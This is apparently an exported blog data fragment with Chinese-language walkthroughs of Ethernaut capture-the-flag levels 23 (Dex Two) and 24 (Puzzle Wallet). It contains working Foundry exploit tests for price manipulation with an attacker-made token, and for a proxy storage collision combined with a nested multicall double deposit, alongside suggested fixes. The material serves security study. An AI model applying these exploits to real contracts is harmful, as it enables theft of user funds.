的流动性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/23_DexTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTwoTest is Test &#123;</span><br><span class=\"line\">    DexTwo instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableTokenTwo token1;</span><br><span class=\"line\">    SwappableTokenTwo token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new DexTwo();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署并设置初始代币</span><br><span class=\"line\">        token1 = new SwappableTokenTwo(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableTokenTwo(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 添加流动性并发送初始代币给 player</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token1), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token2), 100);</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexTwoAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 部署我们自己的恶意代币</span><br><span class=\"line\">        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), &quot;Attack Token&quot;, &quot;ATK&quot;, 400);</span><br><span class=\"line\">        attackToken.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 向 Dex 提供极少量的恶意代币流动性</span><br><span class=\"line\">        attackToken.transfer(address(instance), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 用1个恶意代币换走所有 Token1</span><br><span class=\"line\">        uint256 dexT1Balance = token1.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);</span><br><span class=\"line\">        assertEq(swapAmount1, dexT1Balance, &quot;Price should allow draining Token1&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token1), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 用2个恶意代币换走所有 Token2</span><br><span class=\"line\">        uint256 dexT2Balance = token2.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);</span><br><span class=\"line\">        assertEq(swapAmount2, dexT2Balance, &quot;Price should allow draining Token2&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token2), 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. 验证 Dex 的两种代币都已被耗尽</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 &amp;&amp; token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of both tokens&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>识别漏洞</strong>: 发现 <code>swap</code> 函数缺少对交易代币的白名单验证。</li>\n<li><strong>创建攻击代币</strong>: 部署一个我们自己控制的ERC20代币。</li>\n<li><strong>注入虚假流动性</strong>: 向 <code>DexTwo</code> 合约发送极少量的攻击代币，以建立一个极不平衡的交易对。</li>\n<li><strong>耗尽Token1</strong>: 用少量攻击代币交换 <code>DexTwo</code> 中所有的 <code>Token1</code>。</li>\n<li><strong>耗尽Token2</strong>: 再次用少量攻击代币交换 <code>DexTwo</code> 中所有的 <code>Token2</code>。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>严格的输入验证</strong>: 这是最关键的防御措施。合约必须严格验证所有外部输入，特别是那些决定核心逻辑的参数，如本例中的代币地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议：加回被移除的验证</span><br><span class=\"line\">function swap(address from, address to, uint amount) public &#123;</span><br><span class=\"line\">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class=\"line\">    // ... a reste of the swap logic</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用白名单</strong>: 对于允许哪些代币参与交互的系统，应维护一个可信代币的白名单，并对所有传入的代币地址进行检查。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>输入验证</strong>: 智能合约安全中最基本也是最重要的原则之一。永远不要相信来自外部的输入。</li>\n<li><strong>代币白名单</strong>: 一种常见的安全模式，用于限制系统只与预先批准的、受信任的代币合约进行交互。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>缺少对输入参数（如代币地址）的验证是一个严重的安全漏洞。</li>\n<li>在去中心化交易所（DEX）中，如果允许任意代币参与交易，攻击者可以通过引入自己控制的代币来轻易地操纵价格。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>创建一个新的、由攻击者完全控制的ERC20代币。</li>\n<li>将这个新代币与目标代币在一个缺乏验证的DEX中形成交易对。</li>\n<li>利用极不平衡的流动性比例，以极低的价格换取所有目标代幣。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>对所有函数的输入参数进行严格的白名单或有效性检查。</li>\n<li>确保核心业务逻辑（如交易）只能在预期的、受信任的资产之间进行。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-107\">SWC-107: Unchecked External Call</a> (虽然本例是缺少验证，但根源都是对外部输入&#x2F;合约的不信任)</li>\n<li><a href=\"https://secureum.substack.com/p/security-pitfalls-and-best-practices-101\">Secureum: Input Validation</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-23-Dex-Two-任意代币对价格操纵\"><a href=\"#🎯-Ethernaut-Level-23-Dex-Two-任意代币对价格操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵\"></a>🎯 Ethernaut Level 23: Dex Two - 任意代币对价格操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/23\">Ethernaut Level 23 - Dex Two</a><br><strong>攻击类型</strong>: 价格操纵 &#x2F; 缺少输入验证<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>与上一关类似，你需要与一个 <code>Dex</code> 合约交互。但这次的目标更具挑战性：你需要同时耗尽 <code>Dex</code> 合约中 <code>Token1</code> <strong>和</strong> <code>Token2</code> 的全部流动性。</p>\n<ul>\n<li><strong>初始状态</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg\" alt=\"Dex Two Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>DexTwo</code> 合约的代码与上一关的 <code>Dex</code> 几乎完全相同，但有一个微小却致命的改动。在 <code>swap</code> 函数中，一行关键的验证代码被移除了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// This line was present in Dex, but is missing in DexTwo</span><br><span class=\"line\">// require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这行代码原本用于确保交易只在 <code>token1</code> 和 <code>token2</code> 之间进行。由于它被移除了，<code>DexTwo</code> 的 <code>swap</code> 函数现在可以接受<strong>任何</strong>符合ERC20标准的代币作为交易对的一方。</p>\n<p>这就为我们打开了攻击的大门。我们可以创建一个我们自己控制的、毫无价值的“攻击代币”（我们称之为 <code>Token3</code>），并用它来操纵与 <code>Token1</code> 和 <code>Token2</code> 的交易价格。</p>\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><p>我们的策略是利用我们自己创建的 <code>Token3</code> 作为媒介，以极低的价格换取 <code>Dex</code> 池中所有的 <code>Token1</code> 和 <code>Token2</code>。</p>\n<ol>\n<li><p><strong>创建并分发攻击代币</strong>: 我们创建一个新的ERC20代币 <code>Token3</code>，并给自己铸造大量的 <code>Token3</code>。</p>\n</li>\n<li><p><strong>为 <code>Token3</code> 提供“流动性”</strong>: 我们向 <code>DexTwo</code> 合约发送极少量的 <code>Token3</code>（例如，1个）。现在 <code>DexTwo</code> 合约中 <code>Token3</code> 的余额为1。</p>\n</li>\n<li><p><strong>第一次交换 (Token3 -&gt; Token1)</strong>:</p>\n<ul>\n<li>我们现在用 <code>Token3</code> 交换 <code>Token1</code>。池中 <code>Token1</code> 的余额是100，<code>Token3</code> 的余额是1。价格比为 100:1。</li>\n<li>我们只需要发送1个 <code>Token3</code>，就可以根据价格公式换取 <code>(1 * 100) / 1 = 100</code> 个 <code>Token1</code>。</li>\n<li>交换后，<code>Dex</code> 池中的 <code>Token1</code> 被全部换走。</li>\n</ul>\n</li>\n<li><p><strong>第二次交换 (Token3 -&gt; Token2)</strong>:</p>\n<ul>\n<li>现在池中 <code>Token2</code> 的余额是100，<code>Token3</code> 的余额是2（我们第一次交换时转入了1个，现在又转入了1个）。价格比为 100:2，即 50:1。</li>\n<li>我们发送2个 <code>Token3</code>，就可以换取 <code>(2 * 100) / 2 = 100</code> 个 <code>Token2</code>。</li>\n<li>交换后，<code>Dex</code> 池中的 <code>Token2</code> 也被全部换走。</li>\n</ul>\n</li>\n</ol>\n<p>通过引入一个我们完全控制的第三方代币，我们成功地操纵了价格，并用极小的代价（总共3个我们自己随意铸造的 <code>Token3</code>）清空了整个 <code>Dex</code> 池。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将模拟上述的攻击流程：创建新代币，并用它来耗尽 <code>DexTwo</code> 的流动性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/23_DexTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTwoTest is Test &#123;</span><br><span class=\"line\">    DexTwo instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableTokenTwo token1;</span><br><span class=\"line\">    SwappableTokenTwo token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new DexTwo();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署并设置初始代币</span><br><span class=\"line\">        token1 = new SwappableTokenTwo(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableTokenTwo(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 添加流动性并发送初始代币给 player</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token1), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token2), 100);</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexTwoAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 部署我们自己的恶意代币</span><br><span class=\"line\">        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), &quot;Attack Token&quot;, &quot;ATK&quot;, 400);</span><br><span class=\"line\">        attackToken.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 向 Dex 提供极少量的恶意代币流动性</span><br><span class=\"line\">        attackToken.transfer(address(instance), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 用1个恶意代币换走所有 Token1</span><br><span class=\"line\">        uint256 dexT1Balance = token1.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);</span><br><span class=\"line\">        assertEq(swapAmount1, dexT1Balance, &quot;Price should allow draining Token1&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token1), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 用2个恶意代币换走所有 Token2</span><br><span class=\"line\">        uint256 dexT2Balance = token2.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);</span><br><span class=\"line\">        assertEq(swapAmount2, dexT2Balance, &quot;Price should allow draining Token2&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token2), 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. 验证 Dex 的两种代币都已被耗尽</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 &amp;&amp; token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of both tokens&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>识别漏洞</strong>: 发现 <code>swap</code> 函数缺少对交易代币的白名单验证。</li>\n<li><strong>创建攻击代币</strong>: 部署一个我们自己控制的ERC20代币。</li>\n<li><strong>注入虚假流动性</strong>: 向 <code>DexTwo</code> 合约发送极少量的攻击代币，以建立一个极不平衡的交易对。</li>\n<li><strong>耗尽Token1</strong>: 用少量攻击代币交换 <code>DexTwo</code> 中所有的 <code>Token1</code>。</li>\n<li><strong>耗尽Token2</strong>: 再次用少量攻击代币交换 <code>DexTwo</code> 中所有的 <code>Token2</code>。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>严格的输入验证</strong>: 这是最关键的防御措施。合约必须严格验证所有外部输入，特别是那些决定核心逻辑的参数，如本例中的代币地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议：加回被移除的验证</span><br><span class=\"line\">function swap(address from, address to, uint amount) public &#123;</span><br><span class=\"line\">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class=\"line\">    // ... a reste of the swap logic</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用白名单</strong>: 对于允许哪些代币参与交互的系统，应维护一个可信代币的白名单，并对所有传入的代币地址进行检查。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>输入验证</strong>: 智能合约安全中最基本也是最重要的原则之一。永远不要相信来自外部的输入。</li>\n<li><strong>代币白名单</strong>: 一种常见的安全模式，用于限制系统只与预先批准的、受信任的代币合约进行交互。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>缺少对输入参数（如代币地址）的验证是一个严重的安全漏洞。</li>\n<li>在去中心化交易所（DEX）中，如果允许任意代币参与交易，攻击者可以通过引入自己控制的代币来轻易地操纵价格。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>创建一个新的、由攻击者完全控制的ERC20代币。</li>\n<li>将这个新代币与目标代币在一个缺乏验证的DEX中形成交易对。</li>\n<li>利用极不平衡的流动性比例，以极低的价格换取所有目标代幣。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>对所有函数的输入参数进行严格的白名单或有效性检查。</li>\n<li>确保核心业务逻辑（如交易）只能在预期的、受信任的资产之间进行。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-107\">SWC-107: Unchecked External Call</a> (虽然本例是缺少验证，但根源都是对外部输入&#x2F;合约的不信任)</li>\n<li><a href=\"https://secureum.substack.com/p/security-pitfalls-and-best-practices-101\">Secureum: Input Validation</a></li>\n</ul>\n"},{"title":"Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞","date":"2025-01-25T09:05:00.000Z","updated":"2025-01-25T09:05:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入剖析代理合约（Proxy）中的存储布局冲突问题，并利用 `multicall` 函数中的逻辑漏洞绕过重入保护。通过一系列精心设计的嵌套调用，最终提升为代理合约的 `admin`，掌握 Puzzle Wallet 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 24: Puzzle Wallet - 代理存储冲突与嵌套调用漏洞\n\n> **关卡链接**: [Ethernaut Level 24 - Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)  \n> **攻击类型**: 存储布局冲突 / 逻辑漏洞  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n本关的目标是成为 `PuzzleProxy` 合约的 `admin`。\n\n![Puzzle Wallet Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg)\n\n## 🔍 漏洞分析\n\n这是一个涉及代理合约（Proxy）的复杂挑战，包含了多个漏洞的组合利用。我们需要分步解决几个子问题。\n\n### 漏洞 1: 代理存储布局冲突\n\n首先，我们检查 `PuzzleProxy` (代理) 和 `PuzzleWallet` (逻辑) 合约的存储布局。\n\n**`PuzzleProxy` 的存储:**\n```solidity\ncontract PuzzleProxy is Proxy {\n    address public pendingAdmin; // slot 0\n    address public admin;      // slot 1\n    // ...\n}\n```\n\n**`PuzzleWallet` 的存储:**\n```solidity\ncontract PuzzleWallet is Ownable {\n    address public owner;      // slot 0 (继承自 Ownable)\n    uint256 public maxBalance; // slot 1\n    mapping(address => bool) public whitelisted; // slot 2\n    // ...\n}\n```\n\n由于代理模式使用 `delegatecall`，`PuzzleWallet` 的代码会直接操作 `PuzzleProxy` 的存储。这就导致了存储槽的冲突：\n\n-   `PuzzleProxy` 的 `pendingAdmin` (slot 0) 实际上对应 `PuzzleWallet` 的 `owner` (slot 0)。\n-   `PuzzleProxy` 的 `admin` (slot 1) 实际上对应 `PuzzleWallet` 的 `maxBalance` (slot 1)。\n\n我们的最终目标是成为 `PuzzleProxy` 的 `admin`。根据存储冲突，**我们只需要将 `PuzzleWallet` 的 `maxBalance` 设置为我们的地址即可**。\n\n### 漏洞 2: 成为 `owner` 并加入白名单\n\n要调用 `setMaxBalance()`，我们必须是白名单用户。要加入白名单，我们必须是 `PuzzleWallet` 的 `owner`。\n\n-   `PuzzleWallet` 的 `owner` 存储在 slot 0。\n-   `PuzzleProxy` 的 `proposeNewAdmin()` 函数可以修改 `pendingAdmin`，也就是修改 slot 0。\n\n因此，第一步是通过调用 `proxy.proposeNewAdmin(player_address)` 来将 `wallet.owner` 设置为我们自己的地址。\n\n成为 `owner` 后，我们就可以调用 `wallet.addToWhitelist(player_address)` 将自己加入白名单。\n\n### 漏洞 3: `multicall` 逻辑漏洞与清空合约余额\n\n现在我们是白名单用户了，但 `setMaxBalance()` 还有一个要求：`require(address(this).balance == 0, \"Contract balance is not 0\")`。合约在部署时被存入了 0.001 ether，我们需要想办法将合约余额清空。\n\n`execute()` 函数可以提款，但我们只能提出我们存入的金额。问题在于合约中已有的 0.001 ether。\n\n关键在于 `multicall()` 函数：\n\n```solidity\nfunction multicall(bytes[] calldata data) external payable onlyWhitelisted {\n    bool depositCalled = false;\n    for (uint i = 0; i < data.length; i++) {\n        // ...\n        if (selector == this.deposit.selector) {\n            require(!depositCalled, \"Deposit can only be called once\");\n            depositCalled = true;\n        }\n        (bool success, ) = address(this).delegatecall(data[i]);\n        // ...\n    }\n}\n```\n\n函数通过 `depositCalled` 标志位来防止在一次 `multicall` 中多次调用 `deposit()`。但是，这个保护措施是有缺陷的。`depositCalled` 是一个局部变量，它的作用域仅限于单次 `multicall` 调用。如果我们**在一个 `multicall` 调用中嵌套另一个 `multicall` 调用**，那么内部的 `multicall` 会有自己的、全新的 `depositCalled` 标志位。\n\n这允许我们绕过检查，实现“双重存款”：\n\n1.  我们向 `multicall` 发送 0.001 ether。\n2.  `multicall` 的第一个调用是 `deposit()`。这会把我们的 `msg.value` (0.001 ether) 存入，并将我们的余额记录为 0.001 ether。\n3.  `multicall` 的第二个调用是**对 `multicall` 自身的嵌套调用**。在这个嵌套调用中，我们再次调用 `deposit()`。\n4.  由于 `delegatecall` 的特性，`msg.value` 在嵌套调用中保持不变。因此，第二次 `deposit()` 会再次将同一个 `msg.value` (0.001 ether) 存入，使我们的记录余额变为 0.002 ether。\n\n我们只发送了 0.001 ether，但在合约中的存款记录却是 0.002 ether。现在，我们调用 `execute(player, 0.002 ether, \"\")`，就可以提走合约中所有的资金（我们存入的0.001 + 合约原有的0.001）。\n\n### 最终攻击流程\n\n1.  **成为 `owner`**: 调用 `proxy.proposeNewAdmin(player)`。\n2.  **加入白名单**: 调用 `wallet.addToWhitelist(player)`。\n3.  **双重存款**: 构造一个嵌套的 `multicall` 调用，发送 0.001 ether，使自己的存款记录变为 0.002 ether。\n4.  **清空合约**: 调用 `wallet.execute(player, 0.002 ether, \"\")` 提走所有资金。\n5.  **成为 `admin`**: 调用 `wallet.setMaxBalance(uint256(uint160(player)))`，将 `maxBalance` (即 `admin`) 设置为我们的地址。\n\n## 💻 Foundry 实现\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/24_PuzzleWallet.sol\";\n\ncontract PuzzleWalletTest is Test {\n    PuzzleProxy proxy;\n    address player;\n    PuzzleWallet wallet;\n\n    function setUp() public {\n        player = vm.addr(1);\n\n        // 部署逻辑合约和代理合约\n        PuzzleWallet puzzleWallet = new PuzzleWallet();\n        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);\n        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);\n        wallet = PuzzleWallet(address(proxy));\n\n        // 初始设置，存入 0.001 ether\n        vm.deal(address(this), 0.001 ether);\n        wallet.addToWhitelist(address(this));\n        wallet.deposit{value: 0.001 ether}();\n    }\n\n    function testPuzzleWalletAttack() public {\n        vm.deal(player, 0.001 ether);\n        vm.startPrank(player);\n\n        // 1. 成为 owner\n        proxy.proposeNewAdmin(player);\n\n        // 2. 加入白名单\n        wallet.addToWhitelist(player);\n\n        // 3. 构造嵌套 multicall 以实现双重存款\n        bytes[] memory nestedCalls = new bytes[](1);\n        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n\n        bytes[] memory calls = new bytes[](2);\n        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);\n        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);\n        \n        // 发送 0.001 ether，但存款两次\n        wallet.multicall{value: 0.001 ether}(calls);\n\n        // 4. 提走所有资金 (0.002 ether)\n        wallet.execute(player, 0.002 ether, \"\");\n\n        // 5. 成为 admin\n        wallet.setMaxBalance(uint256(uint160(player)));\n\n        // 验证成功\n        assertEq(proxy.admin(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## 🛡️ 防御措施\n\n1.  